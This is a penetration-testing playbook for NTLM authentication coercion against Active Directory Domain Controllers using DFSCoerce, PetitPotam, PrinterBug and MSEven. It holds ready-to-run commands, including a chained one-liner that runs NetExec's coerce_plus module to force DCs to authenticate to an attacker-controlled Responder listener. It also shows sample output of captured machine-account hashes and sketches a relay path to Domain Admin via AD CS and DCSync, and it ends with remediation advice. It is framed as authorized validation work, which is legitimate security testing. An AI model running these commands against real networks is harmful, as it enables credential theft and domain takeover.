# AD Coercion Validation Playbook

**Techniques:** DFSCoerce, PetitPotam, PrinterBug, MSEven  
**MITRE:** [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/)  
**Auth Required:** Yes (low-priv domain user)  
**Tags:** #playbook #AD #coercion #NTLM #validation

---

## Objective
Validate that Domain Controllers are vulnerable to NTLM authentication coercion attacks by forcing outbound authentication and capturing the resulting hash.

---

## Prerequisites
- Machine on the same network as DCs (Linux preferred)
- Valid domain credentials (low-priv sufficient)
- NetExec (`nxc`) installed
- Responder installed
- Active SOW covering DC targets

---

## Step 1 — DC Discovery (Unauthenticated)

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain> \
  | grep ldap \
  | cut -d' ' -f 6 \
  | sed 's/\.$//'
```

---

## Step 2 — Confirm Hosts Alive

```bash
while read -r host; do ping -c 1 -W 1 "$host"; done \
  | grep PING \
  | cut -d' ' -f 3 \
  | tr -d '()'
```

---

## Step 3 — Start Listener (separate terminal)

```bash
sudo responder -I <interface> -A
```

Use `-A` (analyze mode) — passive capture only, no poisoning.

---

## Step 4 — Run coerce_plus

```bash
nxc smb <targets> -u <USER> -p <PASS> -M coerce_plus -o LISTENER=<YOUR_IP>
```

---

## Full One-Liner

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain> \
  | grep ldap | cut -d' ' -f 6 | sed 's/\.$//' \
  | while read -r host; do ping -c 1 -W 1 "$host"; done \
  | grep PING | cut -d' ' -f 3 | tr -d '()' \
  | while read -r host; do \
      nxc smb "$host" -u <USER> -p <PASS> -M coerce_plus -o LISTENER=<YOUR_IP>; \
    done
```

---

## Expected Output

**NetExec:**
```
COERCE_PLUS <IP> 445 <HOSTNAME> VULNERABLE, DFSCoerce
COERCE_PLUS <IP> 445 <HOSTNAME> Exploit Success, netdfs\NetrDfsRemoveRootTarget
COERCE_PLUS <IP> 445 <HOSTNAME> VULNERABLE, PetitPotam
COERCE_PLUS <IP> 445 <HOSTNAME> Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS <IP> 445 <HOSTNAME> VULNERABLE, PrinterBug
COERCE_PLUS <IP> 445 <HOSTNAME> Exploit Success, spoolss\
COERCE_PLUS <IP> 445 <HOSTNAME> VULNERABLE, MSEven
```

**Responder:**
```
[SMB] NTLMv1-SSP Client   : <DC_IP>
[SMB] NTLMv1-SSP Username : DOMAIN\<DC_hostname>$
[SMB] NTLMv1-SSP Hash     : <hash>
```

---

## Evidence to Capture
- [ ] Screenshot: nxc output showing `VULNERABLE` and `Exploit Success`
- [ ] Screenshot: Responder output showing captured hash from DC machine account (`$`)
- [ ] Note: which techniques fired, which DC hostnames/IPs affected
- [ ] Note: NTLMv1 vs NTLMv2 (NTLMv1 = additional finding)

---

## Relay Attack Path (for report context)
```
Coerce DC auth outbound
  → Relay to AD CS (ESC8) → Domain Admin certificate → DCSync
  → Relay to LDAP → Shadow credentials / RBCD
```

---

## Remediation

| Technique | Fix |
|-----------|-----|
| PrinterBug | Disable Print Spooler on all DCs |
| PetitPotam | Disable EFS RPC; enable EPA on AD CS |
| DFSCoerce | Disable DFS Namespace service where unused |
| MSEven | SMB/LDAP signing; network segmentation |
| All | Enforce SMB signing + LDAP signing |

---

## Related
- [[ttps/recon/dc-discovery-dns]]
- [[ttps/coercion/petitpotam]]
- [[ttps/coercion/printerbug]]
- [[ttps/coercion/dfscoerce]]
- [[ttps/coercion/mseven]]
- [[tools/nxc]]
- [[tools/responder]]
